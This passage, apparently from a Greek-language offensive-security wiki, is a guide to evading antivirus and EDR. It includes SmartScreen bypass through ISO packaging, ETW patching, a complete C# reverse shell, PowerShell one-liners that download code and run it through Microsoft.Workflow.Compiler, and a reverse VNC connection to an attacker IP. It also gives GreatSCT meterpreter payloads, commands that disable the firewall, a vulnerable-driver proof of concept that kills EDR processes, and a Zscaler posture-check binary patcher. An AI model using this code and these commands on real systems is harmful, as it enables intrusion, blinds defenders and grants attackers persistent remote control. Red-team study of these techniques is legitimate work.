2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα original namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να παρατηρήσετε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload. Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το malicious sample – χρήσιμο όταν εργάζεστε σε έναν offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα open-source fork της [LLVM](http://www.llvm.org/) compilation suite ικανό να βελτιώσει την ασφάλεια του λογισμικού μέσω της [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και του tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιηθεί η γλώσσα `C++11/14` για να παραχθεί, κατά το compile time, obfuscated code χωρίς να χρησιμοποιηθεί εξωτερικό εργαλείο και χωρίς να τροποποιηθεί ο compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο αποσκοπημένων (obfuscated) operations που παράγονται από το C++ template metaprogramming framework, καθιστώντας τη ζωή αυτού που θέλει να crack-άρει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα pe αρχεία συμπεριλαμβανομένων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα στο επίπεδο assembly code μετασχηματίζοντας κανονικές εντολές σε ROP chains, αποφεύγοντας την φυσική μας αντίληψη για τον κανονικό έλεγχο ροής.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια executables από το internet και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που στοχεύει στην προστασία του τελικού χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη (reputation-based), που σημαίνει ότι εφαρμογές που έχουν σπάνιες λήψεις θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το internet, μαζί με το URL από το οποίο λήφθηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που λήφθηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι εκτελέσιμα αρχεία που έχουν υπογραφεί με ένα **εμπιστευμένο** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να λάβουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** εφαρμοστεί σε **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα tool που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής σε Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για να παρακολουθούν και να εντοπίζουν κακόβουλες δραστηριότητες.

Παρόμοια με τον τρόπο που το AMSI απενεργοποιείται (bypassed) είναι επίσης δυνατό να κάνετε τη συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει άμεσα χωρίς να καταγράφει κανένα συμβάν. Αυτό επιτυγχάνεται με το να γίνει patch της συνάρτησης στη μνήμη ώστε να επιστρέφει άμεσα, ουσιαστικά απενεργοποιώντας την καταγραφή ETW για αυτή τη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στο **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Το φόρτωμα C# binaries στη μνήμη είναι γνωστό εδώ και καιρό και παραμένει ένας εξαιρετικός τρόπος για να τρέξετε τα post-exploitation εργαλεία σας χωρίς να εντοπιστείτε από AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί μόνο να ασχοληθούμε με το patching του AMSI για ολόκληρη τη διεργασία.

Οι περισσότερες C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει το **spawn ενός νέου θυσιαστικού process**, την έγχυση του post-exploitation κακόβουλου κώδικα σε εκείνη τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και όταν τελειώσει, την τερματισμός της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **έξω** από τη διεργασία του Beacon implant. Αυτό σημαίνει ότι αν κάτι στην post-exploitation ενέργειά μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant μας να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την έγχυση του post-exploitation κακόβουλου κώδικα **στο ίδιο του το process**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και το σκανάρισμα από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να κάνει crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το φόρτωμα C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στη συμβιβασμένη μηχανή πρόσβαση **στο interpreter environment εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε **να εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** της συμβιβασμένης μηχανής.

Το repo αναφέρει: Defender εξακολουθεί να σκανάρει τα scripts αλλά με τη χρήση Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να bypass static signatures**. Δοκιμές με τυχαία μη-obfuscated reverse shell scripts σε αυτές τις γλώσσες έδειξαν επιτυχία.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **χειραγωγήσει το access token ή ένα προϊόν ασφαλείας όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges έτσι ώστε η διεργασία να μην πεθάνει αλλά να μην έχει δικαιώματα να ελέγξει για κακόβουλες δραστηριότητες.

Για να το αποτρέψει αυτό, τα Windows θα μπορούσαν να **απαγορεύσουν σε εξωτερικές διεργασίες** να αποκτούν handles πάνω στα tokens των διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε απλώς το Chrome Remote Desktop σε ένα θύμα και στη συνέχεια να το χρησιμοποιήσετε για takeover και να διατηρήσετε persistence:
1. Download from https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και στη συνέχεια κάντε κλικ στο MSI αρχείο για Windows για να κατεβάσετε το MSI.
2. Run the installer silently στο θύμα (απαιτείται admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και κάντε κλικ στο next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε· πατήστε το κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την δεδομένη παράμετρο με μερικές προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει να ορίσετε το pin χωρίς χρήση της GUI).

## Advanced Evasion

Η evasion είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι πρακτικά αδύνατο να μείνετε εντελώς αόρατοι σε ωριμασμένα περιβάλλοντα.

Κάθε περιβάλλον που θα αντιμετωπίσετε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτρέπω να δείτε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε ένα foothold σε πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτό είναι επίσης μια πολύ καλή ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρεί μέρη του binary** μέχρι να **βρει ποιο μέρος το Defender** βρίσκει ως κακόβουλο και να σας το διαχωρίσει.\
Ένα άλλο εργαλείο που κάνει το **ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows ερχόταν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ρύθμισέ το να **start** όταν εκκινεί το σύστημα και **run** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλάξτε telnet port** (stealth) και απενεργοποιήστε firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και διαμορφώστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε κωδικό στο _VNC Password_
- Ορίστε κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ μέσα στον **victim**

#### **Reverse connection**

Ο **attacker** θα πρέπει να **εκτελέσει μέσα** στο δικό του **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι **προετοιμασμένος** να πιάσει μια reverse **VNC connection**. Έπειτα, μέσα στο **victim**: Εκκινήστε το daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη διακριτικότητα μην κάνετε τα παρακάτω

- Μην ξεκινάτε `winvnc` αν τρέχει ήδη ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινάτε `winvnc` χωρίς `UltraVNC.ini` στον ίδιο φάκελο ή θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using μεταγλωττιστής
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python — παράδειγμα για build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Εξουδετέρωση AV/EDR από τον Kernel Space

Η ομάδα Storm-2603 εκμεταλλεύτηκε ένα μικρό κονσολικό εργαλείο γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις προστασίες endpoint πριν αφήσει ransomware. Το εργαλείο φέρει τον δικό του **ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για να εκτελεί προνομιούχες λειτουργίες στον kernel που ακόμη και οι υπηρεσίες AV Protected-Process-Light (PPL) δεν μπορούν να μπλοκάρουν.

Κύρια σημεία
1. **Signed driver**: Το αρχείο που παραδίδεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργοποιημένο.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον ξεκινά ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. IOCTLs που εκτίθενται από τον driver
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός αυθαίρετης διεργασίας με PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγραφή αυθαίρετου αρχείου στο δίσκο |
| `0x990001D0` | Αποφόρτωση του driver και αφαίρεση του service |

Ελάχιστο proof-of-concept σε C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. Γιατί λειτουργεί: Το BYOVD παρακάμπτει εντελώς τις προστασίες σε user-mode· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τις τερματίσει ή να χειραγωγήσει kernel objects ανεξάρτητα από PPL/PP, ELAM ή άλλα μέτρα σκληρύνσεως.

Ανίχνευση / Αντιμετώπιση
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.  
•  Παρακολουθήστε τη δημιουργία νέων *kernel* services και ειδοποιείτε όταν ένας driver φορτώνεται από έναν world-writable directory ή δεν υπάρχει στον allow-list.  
•  Παρακολουθείστε για user-mode handles προς custom device objects ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των Zscaler Client Connector Posture Checks μέσω On-Disk Binary Patching

Το Zscaler’s **Client Connector** εφαρμόζει κανόνες device-posture τοπικά και βασίζεται στο Windows RPC για να επικοινωνήσει τα αποτελέσματα σε άλλα συστατικά. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **αποκλειστικά client-side** (ένας boolean αποστέλλεται στον server).  
2. Οι εσωτερικές RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **υπογεγραμμένο από Zscaler** (μέσω `WinVerifyTrust`).

Με **patching τεσσάρων υπογεγραμμένων binaries στο δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Αρχική λογική που τροποποιήθηκε | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1`, έτσι κάθε έλεγχος θεωρείται compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμα και unsigned) process μπορεί να bind στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στο tunnel | Παρακάμφθηκε |

Ελάχιστο απόσπασμα του patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι posture checks εμφανίζουν **πράσινο/συμμορφούμενο**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Το παραβιασμένο host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι καθαρά client-side αποφάσεις εμπιστοσύνης και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με μερικά byte patches.

## Κατάχρηση Protected Process Light (PPL) για χειραγώγηση AV/EDR με LOLBINs

Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να τροποποιούν η μία την άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε ακίνδυνη λειτουργικότητα (π.χ. logging) σε ένα περιορισμένο, PPL-backed write primitive εναντίον προστατευμένων καταλόγων που χρησιμοποιούνται από AV/EDR.

Τι κάνει μια διεργασία να τρέχει ως PPL
